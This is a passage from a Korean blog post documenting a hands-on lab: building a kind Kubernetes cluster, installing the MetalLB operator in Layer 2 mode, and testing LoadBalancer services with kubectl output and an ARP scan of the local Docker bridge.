사용해보겠습니다.\n3. kind 구성 a. 초기 구성 현재 작성 중인 디바이스에 kind가 깔려있지 않아 기존 포스팅(리눅스에 KIND 설치하기 w/golang)를 참고하여 설치했습니다.\n기존 포스팅(KIND 톺아보기)과 달라진 점이 있다면, kindest/node:v1.31.0으로 버전을 올려 사용했습니다.\n❯ go version go version go1.22.2 linux/amd64 ❯ go env GOPATH /home/kkumtree/go ❯ go install sigs.k8s.io/kind@v0.24.0 go: downloading sigs.k8s.io/kind v0.24.0 go: downloading github.com/spf13/pflag v1.0.5 go: downloading github.com/alessio/shellescape v1.4.2 go: downloading github.com/spf13/cobra v1.8.0 go: downloading github.com/pkg/errors v0.9.1 go: downloading github.com/mattn/go-isatty v0.0.20 go: downloading golang.org/x/sys v0.6.0 go: downloading github.com/pelletier/go-toml v1.9.5 go: downloading github.com/BurntSushi/toml v1.4.0 go: downloading github.com/evanphx/json-patch/v5 v5.6.0 go: downloading gopkg.in/yaml.v3 v3.0.1 go: downloading sigs.k8s.io/yaml v1.4.0 go: downloading github.com/google/safetext v0.0.0-20220905092116-b49f7bc46da2 ❯ vi .profile # 동적 지정하는 것으로 자세한건 이전 포스팅 참조 ❯ source .profile ❯ kind version kind v0.24.0 go1.22.2 linux/amd64 b. kind 클러스터 yaml 구성 및 구축 당연한 이야기지만, 이미지 크기가 900MB를 넘어서기 때문에 처음 띄울 시 시간이 다소 소요됩니다.\n(Network) Node화된 컨테이너 network cidr: 172.18.0.0/16 Pod network cidr: 10.10.0.0/16 10.10.1.0/24, 10.10.2.0/24, 10.10.3.0/24, 10.10.4.0/24\n쪼개지는 이유 들었던 거 같은데 또 잊었다\u0026hellip; Service network cidr: 10.200.1.0/24 (Entry) featureGates[k8s] Alpha,Beta 상태의 기능 관리 InPlacePodVerticalScaling: false/alpha/1.27/-, 제곧내 MultiCIDRServiceAllocator: false/beta/1.31/-, IPAddress 객체를 사용하여 Service ClusterIP에 대한 IP 주소 할당 추적 extraPortMappings: 호스트와 컨테이너 간 포트 매핑 30000~30004 Topology Aware Routing nodes.labels.topology.kubernetes.io/zone: 이것은 대체 무엇인가?에 대한 해답 \u0026lt;= v1.27: Topology Aware Hints 로 불림. EndpointSlice controller: 할당 가능한 CPU 코어 수를 기반으로 엔드포인트 및 kube-proxy 할당 국문: 토폴로지 인지 힌트, 토폴로지 키 deprecated: 이후 없어질 수 있음 [kubeadmConfigPatches] 제곧내\u0026hellip; 의 느낌이 솔솔 나지만 extraArgs.runtime-config: api/all=true 의미는? 채찍피티코파일럿에게 물어봤더니, 대충 링크를 던져줬습니다. Runtime Configuration 포맷: --runtime-config \u0026lt;comma-separated 'key=value' pairs\u0026gt; 실제: -runtime-config=api/all=true 해당 파라미터: api/all=true|false controls all API versions 다행히 링크는 잘 주셨군요. 이런 숭악한 걸 다들 어떻게 쓰시는 거지 @.@ cat \u0026lt;\u0026lt;EOT\u0026gt; kind-metallb-test.yaml kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 featureGates: \u0026#34;InPlacePodVerticalScaling\u0026#34;: true \u0026#34;MultiCIDRServiceAllocator\u0026#34;: true nodes: - role: control-plane labels: mynode: control-plane topology.kubernetes.io/zone: ap-northeast-2a extraPortMappings: - containerPort: 30000 hostPort: 30000 - containerPort: 30001 hostPort: 30001 - containerPort: 30002 hostPort: 30002 - containerPort: 30003 hostPort: 30003 - containerPort: 30004 hostPort: 30004 kubeadmConfigPatches: - | kind: ClusterConfiguration apiServer: extraArgs: runtime-config: api/all=true controllerManager: extraArgs: bind-address: 0.0.0.0 etcd: local: extraArgs: listen-metrics-urls: http://0.0.0.0:2381 scheduler: extraArgs: bind-address: 0.0.0.0 - | kind: KubeProxyConfiguration metricsBindAddress: 0.0.0.0 - role: worker labels: mynode: worker1 topology.kubernetes.io/zone: ap-northeast-2a - role: worker labels: mynode: worker2 topology.kubernetes.io/zone: ap-northeast-2b - role: worker labels: mynode: worker3 topology.kubernetes.io/zone: ap-northeast-2c networking: podSubnet: 10.10.0.0/16 serviceSubnet: 10.200.1.0/24 EOT 이후 실행합니다.\nkind create cluster --config kind-metallb-test.yaml --name myk8s --image kindest/node:v1.31.0 # Install additional tools docker exec -it myk8s-control-plane sh -c \u0026#39;apt update \u0026amp;\u0026amp; apt install tree psmisc lsof wget bsdmainutils bridge-utils net-tools dnsutils ipset ipvsadm nfacct tcpdump ngrep iputils-ping arping git vim arp-scan -y\u0026#39; 4. 테스트 Pod 구성 a. 환경 기본정보 확인 # cidr check ❯ kubectl cluster-info dump | grep -m 2 -E \u0026#34;cluster-cidr|service-cluster-ip-range\u0026#34; \u0026#34;--service-cluster-ip-range=10.200.1.0/24\u0026#34;, \u0026#34;--cluster-cidr=10.10.0.0/16\u0026#34;, # confirm kube-proxy mode: iptables proxy mode ❯ kubectl describe configmap -n kube-system kube-proxy | grep mode mode: iptables # iptables info # 출력값은 너무 길어서 생략 / MetalLB 설치 후 대조용 for i in filter nat mangle raw ; do echo \u0026#34;\u0026gt;\u0026gt; IPTables Type : $i \u0026lt;\u0026lt;\u0026#34;; docker exec -it myk8s-control-plane iptables -t $i -S ; echo; done for i in filter nat mangle raw ; do echo \u0026#34;\u0026gt;\u0026gt; IPTables Type : $i \u0026lt;\u0026lt;\u0026#34;; docker exec -it myk8s-worker iptables -t $i -S ; echo; done for i in filter nat mangle raw ; do echo \u0026#34;\u0026gt;\u0026gt; IPTables Type : $i \u0026lt;\u0026lt;\u0026#34;; docker exec -it myk8s-worker2 iptables -t $i -S ; echo; done for i in filter nat mangle raw ; do echo \u0026#34;\u0026gt;\u0026gt; IPTables Type : $i \u0026lt;\u0026lt;\u0026#34;; docker exec -it myk8s-worker3 iptables -t $i -S ; echo; done b. 테스트 Pod 생성 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: v1 kind: Pod metadata: name: webpod1 labels: app: webpod spec: nodeName: myk8s-worker containers: - name: container image: traefik/whoami terminationGracePeriodSeconds: 0 --- apiVersion: v1 kind: Pod metadata: name: webpod2 labels: app: webpod spec: nodeName: myk8s-worker2 containers: - name: container image: traefik/whoami terminationGracePeriodSeconds: 0 EOF # pod/webpod1 created # pod/webpod2 created 5. MetalLB 설치 BGP모드는 예전에 시도도 해봤었지만, 여러가지 이유로 L2 Layer 방식으로 설치합니다.\n참고: kube-proxy 의 ipvs 모드 사용 시 \u0026lsquo;strictARP: true\u0026rsquo; 설정 필요\n그냥 Documentation 보세요\nhttps://metallb.universe.tf/installation/ 스터디 시간에는 Manifest로 진행했지만,\n오늘도 청개구리는 Operator로 설치할 겁니다 (?_?) OperatorHub: metallb-operator (참고용) FRR모드 BGP세션을 BFD세션으로 백업 BGP Only 대비 빠르게 오류를 검증한다고 합니다. BFD?: Docs/Juniper Networks Bidirectional Forwarding Detection a. GitHub, GitHub를 보자\u0026hellip; 음, 오퍼레이터허브에 들어왔더니 뭐가 뭔지 모르겠습니다. GitHub로 재빠르게 도?망칩니다.\nmetallb/metallb-operator 다행히 README는 멀쩡하네요. 아니 생각보다 괜찮은데요?\nkind는 원래 개발 환경용인지라, e2e테스트까지 제공하네요. git clone https://github.com/metallb/metallb-operator.git cd metallb-operator make deploy cat \u0026lt;\u0026lt; EOF | kubectl apply -f - apiVersion: metallb.io/v1beta1 kind: MetalLB metadata: name: metallb namespace: metallb-system EOF make test make test-e2e 그저 Quick Start 닥돌해보겠습니다.\n마지막 커밋 메시지가 아래와 같은데\u0026hellip;\n뭐 괜찮겠죠 Openshift: instruct the cluster network operator to deploy frrk8s\nb. Quick Start # 아래 커맨드 응용 # kubectl apply -f bin/metallb-operator.yaml # CRD (및 오퍼레이터 배포 커맨드) 다운로드 curl -LO https://raw.githubusercontent.com/metallb/metallb-operator/refs/heads/main/bin/metallb-operator.yaml # CRD 적용. 확인해보니 오퍼레이터도 함께 배포하는 모양 kubectl apply -f metallb-operator.yaml 아래와 유사하게 출력됩니다.\n❯ curl -LO https://raw.githubusercontent.com/metallb/metallb-operator/refs/heads/main/bin/metallb-operator.yaml % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 233k 100 233k 0 0 799k 0 --:--:-- --:--:-- --:--:-- 797k ❯ kubectl apply -f metallb-operator.yaml namespace/metallb-system created customresourcedefinition.apiextensions.k8s.io/bfdprofiles.metallb.io created customresourcedefinition.apiextensions.k8s.io/bgpadvertisements.metallb.io created customresourcedefinition.apiextensions.k8s.io/bgppeers.metallb.io created customresourcedefinition.apiextensions.k8s.io/communities.metallb.io created customresourcedefinition.apiextensions.k8s.io/frrconfigurations.frrk8s.metallb.io created customresourcedefinition.apiextensions.k8s.io/frrnodestates.frrk8s.metallb.io created customresourcedefinition.apiextensions.k8s.io/ipaddresspools.metallb.io created customresourcedefinition.apiextensions.k8s.io/l2advertisements.metallb.io created customresourcedefinition.apiextensions.k8s.io/metallbs.metallb.io created customresourcedefinition.apiextensions.k8s.io/servicel2statuses.metallb.io created serviceaccount/manager-account created role.rbac.authorization.k8s.io/metallb-manager-role created clusterrole.rbac.authorization.k8s.io/metallb-manager-role created rolebinding.rbac.authorization.k8s.io/metallb-manager-rolebinding created clusterrolebinding.rbac.authorization.k8s.io/metallb-manager-rolebinding created secret/metallb-operator-webhook-server-cert created secret/metallb-webhook-cert created service/metallb-operator-webhook-service created service/metallb-webhook-service created deployment.apps/metallb-operator-controller-manager created deployment.apps/metallb-operator-webhook-server created validatingwebhookconfiguration.admissionregistration.k8s.io/metallb-operator-webhook-configuration created validatingwebhookconfiguration.admissionregistration.k8s.io/metallb-webhook-configuration created serviceaccount/controller created serviceaccount/frr-k8s-daemon created serviceaccount/speaker created role.rbac.authorization.k8s.io/controller created role.rbac.authorization.k8s.io/frr-k8s-daemon-role created role.rbac.authorization.k8s.io/frr-k8s-daemon-scc created role.rbac.authorization.k8s.io/pod-lister created role.rbac.authorization.k8s.io/speaker created clusterrole.rbac.authorization.k8s.io/metallb-system:kube-rbac-proxy created clusterrole.rbac.authorization.k8s.io/frr-k8s-daemon-role created clusterrole.rbac.authorization.k8s.io/frr-k8s-metrics-reader created clusterrole.rbac.authorization.k8s.io/frr-k8s-proxy-role created clusterrole.rbac.authorization.k8s.io/metallb-system:controller created clusterrole.rbac.authorization.k8s.io/metallb-system:speaker created rolebinding.rbac.authorization.k8s.io/controller created rolebinding.rbac.authorization.k8s.io/frr-k8s-daemon-rolebinding created rolebinding.rbac.authorization.k8s.io/frr-k8s-daemon-scc-binding created rolebinding.rbac.authorization.k8s.io/pod-lister created rolebinding.rbac.authorization.k8s.io/speaker created clusterrolebinding.rbac.authorization.k8s.io/kube-rbac-proxy created clusterrolebinding.rbac.authorization.k8s.io/frr-k8s-daemon-rolebinding created clusterrolebinding.rbac.authorization.k8s.io/frr-k8s-proxy-rolebinding created clusterrolebinding.rbac.authorization.k8s.io/metallb-system:controller created clusterrolebinding.rbac.authorization.k8s.io/metallb-system:speaker created c. 오퍼레이터 관련 리소스 확인 오퍼레이터가 제대로 적용되었는지 체크해봅시다.\nCRD에 FRR관련 정의도 들어간거 같은데 일단 눈을 감고 해봅시다.\n❯ kubectl get crd | grep metallb bfdprofiles.metallb.io 2024-10-02T14:18:46Z bgpadvertisements.metallb.io 2024-10-02T14:18:46Z bgppeers.metallb.io 2024-10-02T14:18:46Z communities.metallb.io 2024-10-02T14:18:46Z frrconfigurations.frrk8s.metallb.io 2024-10-02T14:18:46Z frrnodestates.frrk8s.metallb.io 2024-10-02T14:18:46Z ipaddresspools.metallb.io 2024-10-02T14:18:46Z l2advertisements.metallb.io 2024-10-02T14:18:46Z metallbs.metallb.io 2024-10-02T14:18:46Z servicel2statuses.metallb.io 2024-10-02T14:18:46Z 아래부터는 이해없이 무따기로 한거라, 양해 부탁드립니다.\nNS, POD(deployment,replicaset), SVC, CM, SECRET, EP 다 셋팅되었네요.\n❯ kubectl get all,configmap,secret,ep -n metallb-system NAME READY STATUS RESTARTS AGE pod/metallb-operator-controller-manager-5dbc8fd577-bgczj 1/1 Running 0 13m pod/metallb-operator-webhook-server-77d47cb764-9lcs8 1/1 Running 0 13m NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE service/metallb-operator-webhook-service ClusterIP 10.200.1.159 \u0026lt;none\u0026gt; 443/TCP 13m service/metallb-webhook-service ClusterIP 10.200.1.149 \u0026lt;none\u0026gt; 443/TCP 13m NAME READY UP-TO-DATE AVAILABLE AGE deployment.apps/metallb-operator-controller-manager 1/1 1 1 13m deployment.apps/metallb-operator-webhook-server 1/1 1 1 13m NAME DESIRED CURRENT READY AGE replicaset.apps/metallb-operator-controller-manager-5dbc8fd577 1 1 1 13m replicaset.apps/metallb-operator-webhook-server-77d47cb764 1 1 1 13m NAME DATA AGE configmap/kube-root-ca.crt 1 13m NAME TYPE DATA AGE secret/metallb-operator-webhook-server-cert Opaque 4 13m secret/metallb-webhook-cert Opaque 4 13m NAME ENDPOINTS AGE endpoints/metallb-operator-webhook-service 10.10.2.2:9443 13m endpoints/metallb-webhook-service 10.10.3.3:9443 13m 파드 내에 kube-rbac-proxy 컨테이너는 프로메테우스 익스포터 역할 제공한다고 합니다.\n❯ kubectl get pods -n metallb-system -l app=metallb -o jsonpath=\u0026#34;{range .items[*]}{.metadata.name}{\u0026#39;:\\n\u0026#39;}{range .spec.containers[*]}{\u0026#39; \u0026#39;}{.name}{\u0026#39; -\u0026gt; \u0026#39;}{.image}{\u0026#39;\\n\u0026#39;}{end}{end}\u0026#34; metallb-operator-webhook-server-77d47cb764-9lcs8: webhook-server -\u0026gt; quay.io/metallb/controller:main metallb 컨트롤러는 디플로이먼트로 배포된다고 합니다.\n❯ kubectl get ds,deploy -n metallb-system NAME READY UP-TO-DATE AVAILABLE AGE deployment.apps/metallb-operator-controller-manager 1/1 1 1 20m deployment.apps/metallb-operator-webhook-server 1/1 1 1 20m 여기서 살짝 싸하네요. 그냥 다 밀어버리고 처음부터 다시 할까;\nspeaker pods(speaker-lorem)가 보이지 않는데, 이거 BGP 같기도\u0026hellip;\ncontrol-plane 이랑 worker2는 어디로?\n❯ kubectl get pod -n metallb-system -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES metallb-operator-controller-manager-5dbc8fd577-bgczj 1/1 Running 0 21m 10.10.2.2 myk8s-worker3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; metallb-operator-webhook-server-77d47cb764-9lcs8 1/1 Running 0 21m 10.10.3.3 myk8s-worker \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 가다듬고 더 잘 찾아보니, OpenShift Docs에서 정상이라고 하네요.\n아직 끝난게 아니다! 셋업이 덜 되서 바로 에러뜹니다.\n❯ kubectl logs -n metallb-system -l app=metallb -f Defaulted container \u0026#34;speaker\u0026#34; out of: speaker, frr, reloader, frr-metrics, cp-frr-files (init), cp-reloader (init), cp-metrics (init) Defaulted container \u0026#34;speaker\u0026#34; out of: speaker, frr, reloader, frr-metrics, cp-frr-files (init), cp-reloader (init), cp-metrics (init) Defaulted container \u0026#34;speaker\u0026#34; out of: speaker, frr, reloader, frr-metrics, cp-frr-files (init), cp-reloader (init), cp-metrics (init) Defaulted container \u0026#34;speaker\u0026#34; out of: speaker, frr, reloader, frr-metrics, cp-frr-files (init), cp-reloader (init), cp-metrics (init) error: you are attempting to follow 6 log streams, but maximum allowed concurrency is 5, use --max-log-requests to increase the limit 자신감을 갖고 이어봅시다.\nd. MetalLB deployment 생성 GitHub 만으로는 도저히 이게 뭘하는 건가 했는데, 스피커를 만들어주는 것 같네요.\n❯ cat \u0026lt;\u0026lt; EOF | kubectl apply -f - apiVersion: metallb.io/v1beta1 kind: MetalLB metadata: name: metallb namespace: metallb-system EOF metallb.metallb.io/metallb created 제발\u0026hellip;! (네트워크 상태가 좋지 않아서 핫스팟\u0026hellip;)\n❯ kubectl get pod -n metallb-system -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES controller-7dd49fb757-rsf9n 0/1 ImagePullBackOff 0 118s 10.10.2.3 myk8s-worker3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; metallb-operator-controller-manager-5dbc8fd577-bgczj 1/1 Running 0 36m 10.10.2.2 myk8s-worker3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; metallb-operator-webhook-server-77d47cb764-9lcs8 1/1 Running 0 36m 10.10.3.3 myk8s-worker \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; speaker-ndwfb 0/4 Init:0/3 0 118s 172.18.0.3 myk8s-worker3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; speaker-vnjlb 0/4 Init:0/3 0 118s 172.18.0.5 myk8s-worker \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; speaker-w9946 0/4 Init:0/3 0 118s 172.18.0.2 myk8s-worker2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; speaker-zgf46 0/4 Init:0/3 0 118s 172.18.0.4 myk8s-control-plane \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 휴\nEvents: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled 2m30s default-scheduler Successfully assigned metallb-system/controller-7dd49fb757-rsf9n to myk8s-worker3 Warning Failed 57s kubelet Failed to pull image \u0026#34;quay.io/metallb/controller:main\u0026#34;: failed to pull and unpack image \u0026#34;quay.io/metallb/controller:main\u0026#34;: failed to copy: read tcp 172.18.0.3:33674-\u0026gt;104.18.37.147:443: read: connection reset by peer Warning Failed 57s kubelet Error: ErrImagePull Normal BackOff 56s kubelet Back-off pulling image \u0026#34;quay.io/metallb/controller:main\u0026#34; Warning Failed 56s kubelet Error: ImagePullBackOff Normal Pulling 45s (x2 over 2m29s) kubelet Pulling image \u0026#34;quay.io/metallb/controller:main\u0026#34; Normal Pulled 31s kubelet Successfully pulled image \u0026#34;quay.io/metallb/controller:main\u0026#34; in 13.488s (13.488s including waiting). Image size: 29150053 bytes. Normal Created 31s kubelet Created container controller Normal Started 31s kubelet Started container controller 잘 돌아갑니다.\n❯ kubectl get pod -n metallb-system -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES controller-7dd49fb757-rsf9n 1/1 Running 0 4m3s 10.10.2.3 myk8s-worker3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; metallb-operator-controller-manager-5dbc8fd577-bgczj 1/1 Running 0 38m 10.10.2.2 myk8s-worker3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; metallb-operator-webhook-server-77d47cb764-9lcs8 1/1 Running 0 38m 10.10.3.3 myk8s-worker \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; speaker-ndwfb 4/4 Running 0 4m3s 172.18.0.3 myk8s-worker3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; speaker-vnjlb 3/4 Running 0 4m3s 172.18.0.5 myk8s-worker \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; speaker-w9946 3/4 Running 0 4m3s 172.18.0.2 myk8s-worker2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; speaker-zgf46 4/4 Running 0 4m3s 172.18.0.4 myk8s-control-plane \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 아직 끝난게 아니다! 셋업이 덜 되서 바로 에러뜹니다.\n라기 보다는 concurrency 에러였군요. --max-log-requests 6로 늘리고 확인해보니 잘 나옵니다.\n❯ kubectl logs -n metallb-system -l app=metallb -f Defaulted container \u0026#34;speaker\u0026#34; out of: speaker, frr, reloader, frr-metrics, cp-frr-files (init), cp-reloader (init), cp-metrics (init) Defaulted container \u0026#34;speaker\u0026#34; out of: speaker, frr, reloader, frr-metrics, cp-frr-files (init), cp-reloader (init), cp-metrics (init) Defaulted container \u0026#34;speaker\u0026#34; out of: speaker, frr, reloader, frr-metrics, cp-frr-files (init), cp-reloader (init), cp-metrics (init) Defaulted container \u0026#34;speaker\u0026#34; out of: speaker, frr, reloader, frr-metrics, cp-frr-files (init), cp-reloader (init), cp-metrics (init) error: you are attempting to follow 6 log streams, but maximum allowed concurrency is 5, use --max-log-requests to increase the limit e. MetalLB ConfigMap 생성 그렇습니다. 이제 kind에서 사용하는 브리지(docker bridge)를 확인하고 이 대역을 잡아줘야합니다.\nkind를 사용하면 기본값으로 kind라는 이름의 브리지를 사용합니다. docker network ls # (sol0) kind alias 대신 Id(SHA256)으로 확인해도 됩니다. 다 같은 조회방법일 뿐. docker network inspect kind # (sol1) docker inspect kind # (sol2) docker inspect \u0026lt;Id\u0026gt; # (sol3) docker network inspect \u0026lt;Id\u0026gt; IP CIDR 조회 docker ps -q | xargs docker inspect --format \u0026#39;{{.Name}} {{.NetworkSettings.Networks.kind.IPAddress}}\u0026#39; # 위의 것 치기 귀찮으면? # 이건 각 Node에 할당 된 IP # docker inspect e8 | grep IPv4Address # 이건 브리지에 정의된 IP 대역 # docker inspect e8 | grep Subnet 그렇군요\n❯ docker network ls NETWORK ID NAME DRIVER SCOPE 9a356b80a908 bridge bridge local d2f5be011872 host host local e8e5256f1aa7 kind bridge local 439c3626705a none null local ❯ docker ps -q | xargs docker inspect --format \u0026#39;{{.Name}} {{.NetworkSettings.Networks.kind.IPAddress}}\u0026#39; /myk8s-worker 172.18.0.2 /myk8s-control-plane 172.18.0.5 /myk8s-worker2 172.18.0.4 /myk8s-worker3 172.18.0.3 ❯ docker inspect e8 | grep Subnet \u0026#34;Subnet\u0026#34;: \u0026#34;172.18.0.0/16\u0026#34;, \u0026#34;Subnet\u0026#34;: \u0026#34;fc00:f853:ccd:e793::/64\u0026#34;, ❯ docker inspect e8 | grep IPv4Address \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.18.0.3/16\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.18.0.4/16\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.18.0.2/16\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.18.0.5/16\u0026#34;, 앞서 CRD를 조회해보면,\nipaddresspools.metallb.io와\nl2advertisements.metallb.io가 있었습니다.\n왜 조회했었는지 알겠\u0026hellip;죠?\n작성 방법 확인 방법\nkubectl explain ipaddresspools.metallb.io kubectl explain l2advertisements.metallb.io MetalLB ConfigMap: (1) IPAddressPool 해당 서브넷에서 설마 이 대역까지는 쓰지 않겠지?란\n경건한 마음으로 MetalLB용 서비스 IP 대역을 설정합니다.\ncat \u0026lt;\u0026lt; EOF \u0026gt; metallb-ipaddresspool.yaml apiVersion: metallb.io/v1beta1 kind: IPAddressPool metadata: name: kkumtree-ippool namespace: metallb-system spec: addresses: - 172.18.255.200-172.18.255.254 EOF kubectl apply -f metallb-ipaddresspool.yaml MetalLB ConfigMap: (2) L2Advertisement 위에서 설정한 IPPool을 Layer2 Advertisement에 등록합니다.\ncat \u0026lt;\u0026lt; EOF \u0026gt; metallb-l2advertisement.yaml apiVersion: metallb.io/v1beta1 kind: L2Advertisement metadata: name: kkumtree-l2adv namespace: metallb-system spec: ipAddressPools: - kkumtree-ippool EOF kubectl apply -f metallb-l2advertisement.yaml 그렇군요\n❯ kubectl get ipaddresspools,l2advertisements -n metallb-system NAME AUTO ASSIGN AVOID BUGGY IPS ADDRESSES ipaddresspool.metallb.io/kkumtree-ippool true false [\u0026#34;172.18.255.200-172.18.255.254\u0026#34;] NAME IPADDRESSPOOLS IPADDRESSPOOL SELECTORS INTERFACES l2advertisement.metallb.io/kkumtree-l2adv [\u0026#34;kkumtree-ippool\u0026#34;] 6. 테스트 서비스 생성 MetalLB에 대한 준비가 끝났으니, LB를 사용하는 서비스와 파드를 생성해봅시다.\ncat \u0026lt;\u0026lt;EOF\u0026gt; metallb-test-svc.yaml apiVersion: v1 kind: Service metadata: name: svc1 spec: ports: - name: svc1-webport port: 80 targetPort: 80 selector: app: webpod type: LoadBalancer --- apiVersion: v1 kind: Service metadata: name: svc2 spec: ports: - name: svc2-webport port: 80 targetPort: 80 selector: app: webpod type: LoadBalancer --- apiVersion: v1 kind: Service metadata: name: svc3 spec: ports: - name: svc3-webport port: 80 targetPort: 80 selector: app: webpod type: LoadBalancer EOF kubectl apply -f metallb-test-svc.yaml 생성 이후 새로운 터미널에서 ARP 스캔을 켜둡니다. ❯ docker exec -it myk8s-control-plane arp-scan --interfac=eth0 --localnet Interface: eth0, type: EN10MB, MAC: 02:42:ac:12:00:05, IPv4: 172.18.0.5 Starting arp-scan 1.10.0 with 65536 hosts (https://github.com/royhills/arp-scan) 172.18.0.1\t02:42:01:57:ec:6f\t(Unknown: locally administered) 172.18.0.2\t02:42:ac:12:00:02\t(Unknown: locally administered) 172.18.0.3\t02:42:ac:12:00:03\t(Unknown: locally administered) 172.18.0.4\t02:42:ac:12:00:04\t(Unknown: locally administered) LoadBalancer 타입의 서비스가 NodePort와 ClusterIP를 포함하는 것을 확인할 수 있습니다. (default) allocateLoadBalancerNodePorts : true ❯ kubectl get svc,ep NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE service/kubernetes ClusterIP 10.200.1.1 \u0026lt;none\u0026gt; 443/TCP 2d20h service/svc1 LoadBalancer 10.200.1.66 172.18.255.200 80:31865/TCP 2m42s service/svc2 LoadBalancer 10.200.1.133 172.18.255.201 80:30199/TCP 2m42s service/svc3 LoadBalancer 10.200.1.175 172.18.255.202 80:30462/TCP 2m42s NAME ENDPOINTS AGE endpoints/kubernetes 172.18.0.5:6443 2d20h endpoints/svc1 10.10.1.2:80,10.10.3.2:80 2m42s endpoints/svc2 10.10.1.2:80,10.10.3.2:80 2m42s endpoints/svc3 10.10.1.2:80,10.10.3.2:80 2m42s 그 사이에 ARP 스캔 중인 터미널에서는 이렇게 바뀌어있네요 ❯ docker exec -it myk8s-control-plane arp-scan --interfac=eth0 --localnet Interface: eth0, type: EN10MB, MAC: 02:42:ac:12:00:05, IPv4: 172.18.0.5 Starting arp-scan 1.10.0 with 65536 hosts (https://github.com/royhills/arp-scan) 172.18.0.1\t02:42:01:57:ec:6f\t(Unknown: locally administered) 172.18.0.2\t02:42:ac:12:00:02\t(Unknown: locally administered) 172.18.0.3\t02:42:ac:12:00:03\t(Unknown: locally administered) 172.18.0.4\t02:42:ac:12:00:04\t(Unknown: locally administered) 172.18.0.1\t02:42:01:57:ec:6f\t(Unknown: locally administered) (DUP: 2) 172.18.0.2\t02:42:ac:12:00:02\t(Unknown: locally administered) (DUP: 2) 172.18.0.3\t02:42:ac:12:00:03\t(Unknown: locally administered) (DUP: 2) 172.18.0.4\t02:42:ac:12:00:04\t(Unknown: locally administered) (DUP: 2) 172.18.0.1\t02:42:01:57:ec:6f\t(Unknown: locally administered) (DUP: 3) 172.18.255.200\t02:42:ac:12:00:02\t(Unknown: locally administered) 172.18.255.201\t02:42:ac:12:00:02\t(Unknown: locally administered) 172.18.255.202\t02:42:ac:12:00:03\t(Unknown: locally administered) 172.18.0.1\t02:42:01:57:ec:6f\t(Unknown: locally administered) (DUP: 4) 172.18.0.1\t02:42:01:57:ec:6f\t(Unknown: locally administered) (DUP: 5) 14 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 65536 hosts scanned in 263.158 seconds (249.04 hosts/sec). 7 responded 그럼 어떤 노드에서 Leader 역할을 하는지 살펴보겠습니다. ❯ kubectl describe svc | grep Events: -A5 Events: \u0026lt;none\u0026gt; Name: svc1 Namespace: default Labels: \u0026lt;none\u0026gt; -- Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal IPAllocated 11m metallb-controller Assigned IP [\u0026#34;172.18.255.200\u0026#34;] Normal nodeAssigned 11m metallb-speaker announcing from node \u0026#34;myk8s-worker\u0026#34; with protocol \u0026#34;layer2\u0026#34; -- Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal IPAllocated 11m metallb-controller Assigned IP [\u0026#34;172.18.255.201\u0026#34;] Normal nodeAssigned 11m (x2 over 11m) metallb-speaker announcing from node \u0026#34;myk8s-worker\u0026#34; with protocol \u0026#34;layer2\u0026#34; -- Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal IPAllocated 11m metallb-controller Assigned IP [\u0026#34;172.18.255.202\u0026#34;] Normal nodeAssigned 11m metallb-speaker announcing from node \u0026#34;myk8s-worker3\u0026#34; with protocol \u0026#34;layer2\u0026#34; 물론, 이쯤되면 배포된 아무 서비스만 잡고 찍어보면 되겠죠?\n❯ kubectl describe svc/svc2 | grep metallb-speaker Normal nodeAssigned 13m (x2 over 13m) metallb-speaker announcing from node \u0026#34;myk8s-worker\u0026#34; with protocol \u0026#34;layer2\u0026#34; 이제 각 노드에 파드를 붙여보겠습니다. 생각해보니 서비스 붙이기 전에 파드를 먼저 붙였어야했는데; cat \u0026lt;\u0026lt;EOT\u0026gt; 3pod.yaml apiVersion: v1 kind: Pod metadata: name: webpod1 labels: app: webpod spec: nodeName: myk8s-worker containers: - name: container image: traefik/whoami terminationGracePeriodSeconds: 0 --- apiVersion: v1 kind: Pod metadata: name: webpod2 labels: app: webpod spec: nodeName: myk8s-worker2 containers: - name: container image: traefik/whoami terminationGracePeriodSeconds: 0 --- apiVersion: v1 kind: Pod metadata: name: webpod3 labels: app: webpod spec: nodeName: myk8s-worker3 containers: - name: container image: traefik/whoami terminationGracePeriodSeconds: 0 EOT kubectl apply -f 3pod.yaml 어쨌거나 저쨌거나, kind 노드에서 접속해서 테스트 하지 않아도\nmetalLB로 생성된 EXTERNAL-IP로도 잘 접속되는 것을 확인했습니다. ❯ kubectl get svc NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE kubernetes ClusterIP 10.200.1.1 \u0026lt;none\u0026gt; 443/TCP 3d3h svc1 LoadBalancer 10.200.1.66 172.18.255.200 80:31865/TCP 6h52m svc2 LoadBalancer 10.200.1.133 